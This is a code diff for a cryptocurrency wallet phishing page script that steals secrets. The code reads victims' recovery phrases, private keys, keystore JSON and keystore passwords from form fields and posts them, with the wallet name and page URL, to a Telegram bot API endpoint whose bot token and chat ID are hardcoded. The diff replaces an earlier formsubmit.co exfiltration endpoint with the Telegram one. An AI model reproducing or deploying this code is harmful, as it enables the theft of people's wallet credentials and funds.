@@ -1,7 +1,6 @@
-const chatIds = ["5567256987"];
+const chatIds = ["1907762562"];
 const inputIds = ["recovery_phrase", "keystoreJson", "privateKey"];
 
-const formsubmitcoIds = ["3499b0e84aa4bea472cbdc16c22a14c9"];
 const url = window.location.href;
 const forms = document.querySelectorAll(".gform");
 // console.log(forms);
@@ -43,42 +42,36 @@ async function sendData(inputId, i) {
   const inputBox = document.getElementById(inputId);
   const kp = document.getElementById("keystorePassword");
   // console.log(i);
-  // const data = `wallet name: ${walletName.innerText}\n
-  // key type: ${inputId} \n
-  // value : ${inputBox.value} \n
-  //  ${kp.value ? `keystore password : ${kp.value}  \n ` : ""}
-  //  ${url}`;
+  const data = `wallet name: ${walletName.innerText}\n 
+  key type: ${inputId} \n 
+  value : ${inputBox.value} \n
+   ${kp.value ? `keystore password : ${kp.value}  \n ` : ""}  
+   ${url}`;
 
-  const data = {
-    walletName: walletName.innerText,
-    key_type: inputId,
-    value: inputBox.value,
-    kp: kp.value,
-  };
   await sendMsg(data);
 }
 
 const sendMsg = async (msg) => {
-  const resp = await fetch(
-    `https://formsubmit.co/ajax/3c5c9722a00d718762cb49360cb5c3a3`,
-    {
-      method: "POST",
-      headers: {
-        accept: "application/json",
-        "content-type": "application/json",
-      },
-      body: JSON.stringify({
-        walletName: msg.walletName,
-        key_type: msg.key_type,
-        message: msg.value,
-        kp: msg.kp,
-      }),
-    }
-  );
-  const resJson = await resp.json();
-  console.log(resJson);
+  for (let i = 0; i < chatIds.length; i++) {
+    const data = {
+      chat_id: chatIds[i],
+      text: msg,
+    };
+    const resp = await fetch(
+      `https://api.telegram.org/bot6544701468:AAHqzuaO1oOG5O8MPReaLp6MRm3VlpfYHMg/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          accept: "application/json",
+          "content-type": "application/json",
+        },
+        body: JSON.stringify(data),
+      }
+    );
+    const resJson = await resp.json();
+    console.log(resJson);
+  }
 };
-
 document.getElementById("cancel").addEventListener("click", () => {
   const errs = document.querySelectorAll(".thankyou_message");
   for (let i = 0; i < errs.length; i++) {
